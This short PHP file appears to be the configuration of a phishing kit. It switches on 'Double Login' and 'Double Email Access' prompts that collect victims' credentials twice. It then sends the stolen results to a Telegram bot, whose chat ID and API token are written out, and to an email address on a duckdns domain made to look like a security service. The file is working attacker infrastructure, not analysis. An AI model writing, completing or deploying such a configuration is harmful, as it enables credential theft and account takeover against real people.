<?php

$doublelogin="on"; // If you want to use Double Login put on otherwise put off

$doubleemailaccess="on"; // If you want to use Double Emaill Access put on otherwise put off

$saveintotxt="no"; // If you want to save in txt file put yes otherwise put no
$sendtotelegram="yes"; // If You Want to result on Telegram put yes otherwise put no
$chat_id = "1925763438"; // Your Telegram Chat ID
$bot_url = "5238382039:AAGzjZ43-25azRYtz3vvPwpwSgBo3W84JiI"; // Your Telegram Bot Api Key
$sendtoemail="yes";// If you want to result on Email put yes otherwise put no
$email = "hu@securitywellsuser.duckdns.org"; // Your Email Here :)


?>

